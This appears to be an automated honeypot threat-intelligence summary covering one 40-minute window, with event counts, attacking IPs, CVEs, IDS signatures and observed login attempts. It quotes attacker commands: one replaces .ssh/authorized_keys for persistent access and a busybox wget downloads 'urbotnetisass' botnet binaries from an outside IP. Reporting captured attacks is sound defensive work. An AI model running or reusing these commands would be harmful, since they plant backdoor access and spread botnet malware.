## Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-11T06:01:28Z
**Timeframe:** Approximately 2025-10-11T05:20:01Z to 2025-10-11T06:00:02Z
**Log Files:**
- `agg_log_20251011T052001Z.json`
- `agg_log_20251011T054002Z.json`
- `agg_log_20251011T060002Z.json`

### Executive Summary

This report summarizes 16,964 events captured by the honeypot network. The majority of activity was observed on the Cowrie (SSH), Suricata (IDS), and Honeytrap honeypots. A significant portion of attacks originated from IP address `81.8.9.18`. The most frequently targeted port was TCP/445, commonly associated with SMB, indicating likely worm or botnet activity such as that related to the DoublePulsar backdoor, which was the most frequently triggered signature. A variety of CVEs were detected, with a focus on web and remote access vulnerabilities.

### Detailed Analysis

**Attacks by Honeypot:**
- **Cowrie:** 5,988
- **Suricata:** 3,993
- **Honeytrap:** 3,195
- **Ciscoasa:** 1,823
- **Dionaea:** 865
- **Mailoney:** 860
- **Tanner:** 82
- **Sentrypeer:** 49
- **H0neytr4p:** 40
- **ConPot:** 21
- **Miniprint:** 19
- **Honeyaml:** 10
- **Redishoneypot:** 9
- **Adbhoney:** 6
- **ElasticPot:** 4

**Top Attacking IPs:**
- `81.8.9.18`
- `176.65.141.117`
- `223.100.22.69`
- `121.41.236.216`
- `4.213.160.153`
- `88.210.63.16`

**Top Targeted Ports/Protocols:**
- TCP/445
- 22 (SSH)
- 25 (SMTP)
- 445 (SMB)
- 5903 (VNC)

**Most Common CVEs:**
- CVE-2024-4577
- CVE-2002-0953
- CVE-2024-3721
- CVE-2021-41773
- CVE-2021-42013
- CVE-2002-0013
- CVE-2002-0012
- CVE-2005-4050
- CVE-2022-27255

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- System reconnaissance commands (`uname -a`, `whoami`, `lscpu`, etc.)
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN NMAP -sS window 1024
- ET HUNTING RDP Authentication Bypass Attempt

**Users / Login Attempts:**
- `345gs5662d34/345gs5662d34`
- `root/Ahgf3487@rtjhskl854hd47893@#a4nC`
- `root/nPSpP4PBW0`
- `support/33333`
- `root/0000000`
- `centos/0000`

**Files Uploaded/Downloaded:**
- `sh`
- `arm.urbotnetisass`
- `arm5.urbotnetisass`
- `arm6.urbotnetisass`
- `arm7.urbotnetisass`
- `x86_32.urbotnetisass`
- `mips.urbotnetisass`
- `mipsel.urbotnetisass`

**HTTP User-Agents:**
- None recorded.

**SSH Clients and Servers:**
- None recorded.

**Top Attacker AS Organizations:**
- None recorded.

### Key Observations and Anomalies

- The high volume of traffic targeting TCP/445, combined with the "DoublePulsar" signature, suggests a concerted campaign to exploit the vulnerabilities associated with the Shadow Brokers leak.
- Attackers on the Cowrie (SSH) honeypot consistently attempt to modify the `.ssh/authorized_keys` file to gain persistent access.
- The `urbotnetisass` malware downloads suggest a campaign targeting various CPU architectures, likely for a botnet.
- A significant number of login attempts use common or easily guessable credentials, highlighting the ongoing threat of brute-force attacks.
